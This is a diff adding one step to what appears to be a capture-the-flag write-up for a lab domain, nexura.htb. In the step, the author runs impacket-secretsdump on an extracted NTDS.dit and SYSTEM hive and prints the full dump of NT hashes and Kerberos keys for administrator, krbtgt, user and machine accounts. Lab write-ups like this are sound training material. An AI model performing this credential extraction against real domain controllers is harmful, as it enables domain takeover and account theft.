@@ -264,4 +264,52 @@ drwxrwxr-x 6 root  root      4096 Jul 19 12:05 PowerHuntShares
 NTDS.dit  SYSTEM
 ```
 
-Step19. Now we will extract the secrets via impacket command and we will 
+Step19. Now we will extract the secrets via impacket command and we will get our answer.
+```bash
+
+┌──(root㉿kali)-[/home/arjun/Downloads/cyber/NTDS]
+└─# impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+^[[6~Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x76b4393403c75a0cb93633c17abf2778
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 9bf8b490fffee672ecfe3bc67e0daf69
+[*] Reading and decrypting hashes from NTDS.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1002:aad3b435b51404eeaad3b435b51404ee:60b488a143608d77968aceebe7b65940:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:11dee8f685882eb4f78a450291569bd0:::
+nexura.htb\bdavid:1105:aad3b435b51404eeaad3b435b51404ee:82c5ef7f2612567964070d04fe46a5d0:::
+nexura.htb\stom:1106:aad3b435b51404eeaad3b435b51404ee:21ea958524cfd9a7791737f8d2f764fa:::
+nexura.htb\hwilliam:1107:aad3b435b51404eeaad3b435b51404ee:f3ac86b290a51fb59a1a66f50b658e1f:::
+FILE01$:1108:aad3b435b51404eeaad3b435b51404ee:b7374a9de2bf6951a5c66a7675df7f2f:::
+JUMP01$:1109:aad3b435b51404eeaad3b435b51404ee:7bef0ee0b472d2c5805921324525f321:::
+[*] Kerberos keys from NTDS.dit 
+Administrator:aes256-cts-hmac-sha1-96:cd6a08bd2809d10a4bd3d41bc0e3ed0e21c7559961edc58209d190aaf9cb02a8
+Administrator:aes128-cts-hmac-sha1-96:6743a42ac84aa2c5c1441aa64c03a3f0
+Administrator:des-cbc-md5:5ec10792619bfb6e
+DC01$:aes256-cts-hmac-sha1-96:0dbd2117deb476358bbc3e7986232e15d9ef60618017dfae723aa8cda4c6b481
+DC01$:aes128-cts-hmac-sha1-96:6e095677bb563a00d8bc2e13fe504ed2
+DC01$:des-cbc-md5:ceb3805b8abf6b2f
+krbtgt:aes256-cts-hmac-sha1-96:69e5591bfd4ca06737b9e29da1dc77611b1e33af7537bccbef3040c5d2ddc09f
+krbtgt:aes128-cts-hmac-sha1-96:9ffbdd5ba3b47488803901aa70b331ee
+krbtgt:des-cbc-md5:587c384a7a793e6d
+nexura.htb\bdavid:aes256-cts-hmac-sha1-96:f7f6449b2788bf507230a6f6e79c5accf17b060dc7d50e2446d91397f8092dee
+nexura.htb\bdavid:aes128-cts-hmac-sha1-96:921921f196fc51d33e9fb279345fb351
+nexura.htb\bdavid:des-cbc-md5:520eb6dc0d51409d
+nexura.htb\stom:aes256-cts-hmac-sha1-96:63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
+nexura.htb\stom:aes128-cts-hmac-sha1-96:c61d601cb033f183e25a135d3a396cad
+nexura.htb\stom:des-cbc-md5:2f8f46c2fe49e6fe
+nexura.htb\hwilliam:aes256-cts-hmac-sha1-96:6f098c0966f8a46698cd2d3b258856b26811bbd120dd0c6b6b62156035e4ebe9
+nexura.htb\hwilliam:aes128-cts-hmac-sha1-96:2fb4de7ead6bc5f5e278596ba7f29be1
+nexura.htb\hwilliam:des-cbc-md5:c1676b54e061c7ae
+FILE01$:aes256-cts-hmac-sha1-96:ffaf60d490100bff3aa2becad0c14f6cbdc5316cebc62ecf1884fbd3218cb938
+FILE01$:aes128-cts-hmac-sha1-96:f6f29e95a1e17053eb0b88a25d373bf9
+FILE01$:des-cbc-md5:d6a1c72358e50bb6
+JUMP01$:aes256-cts-hmac-sha1-96:9521aa66829ccb2e8263c0fd7ac25e909bba456a1474ecac6676ace5ce7a812b
+JUMP01$:aes128-cts-hmac-sha1-96:37d4bc9e0e866864ab16a4d5d70f4b70
+JUMP01$:des-cbc-md5:a715e9eaf761b083
+[*] Cleaning up...
+```
+
